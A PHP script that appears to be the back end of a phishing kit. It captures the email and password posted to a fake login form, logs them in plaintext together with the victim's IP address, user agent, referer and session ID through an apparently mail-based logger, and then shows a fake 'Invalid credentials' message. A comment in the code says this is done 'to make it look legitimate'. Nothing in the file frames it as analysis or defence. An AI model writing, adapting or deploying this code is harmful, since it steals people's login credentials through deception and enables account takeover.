<?php
session_start();
error_reporting(0);
ini_set('display_errors', 0);

require_once 'smtp_logger.php';
require_once 'config.php';

// Initialize logger
$logger = new SMTPLogger();

// Function to get client IP address
function getClientIP() {
    $ipKeys = array('HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR');
    foreach ($ipKeys as $key) {
        if (array_key_exists($key, $_SERVER) === true) {
            foreach (explode(',', $_SERVER[$key]) as $ip) {
                $ip = trim($ip);
                if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false) {
                    return $ip;
                }
            }
        }
    }
    return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
}

// Function to get user agent
function getUserAgent() {
    return $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
}

// Function to get browser info
function getBrowserInfo() {
    $userAgent = getUserAgent();
    $browser = 'Unknown';
    
    if (strpos($userAgent, 'Chrome') !== false) {
        $browser = 'Chrome';
    } elseif (strpos($userAgent, 'Firefox') !== false) {
        $browser = 'Firefox';
    } elseif (strpos($userAgent, 'Safari') !== false) {
        $browser = 'Safari';
    } elseif (strpos($userAgent, 'Edge') !== false) {
        $browser = 'Edge';
    } elseif (strpos($userAgent, 'Opera') !== false) {
        $browser = 'Opera';
    }
    
    return $browser;
}

// Check if request is POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    
    // Get form data
    $email = isset($_POST['email']) ? trim($_POST['email']) : '';
    $password = isset($_POST['password']) ? trim($_POST['password']) : '';
    
    // Validate input
    if (empty($email) || empty($password)) {
        echo json_encode(['status' => 'error', 'message' => 'Email and password are required']);
        exit;
    }
    
    // Prepare log data
    $logData = [
        'timestamp' => date('Y-m-d H:i:s'),
        'email' => $email,
        'password' => $password,
        'ip_address' => getClientIP(),
        'user_agent' => getUserAgent(),
        'browser' => getBrowserInfo(),
        'referer' => $_SERVER['HTTP_REFERER'] ?? 'Direct',
        'session_id' => session_id(),
        'server_name' => $_SERVER['SERVER_NAME'] ?? 'Unknown',
        'request_uri' => $_SERVER['REQUEST_URI'] ?? 'Unknown'
    ];
    
    // Log the attempt
    $logger->logAttempt($logData);
    
    // Simulate a failed login to make it look legitimate
    echo json_encode(['status' => 'error', 'message' => 'Invalid credentials']);
    
} else {
    // Redirect to main page if accessed directly
    header('Location: index.html');
    exit;
}
?>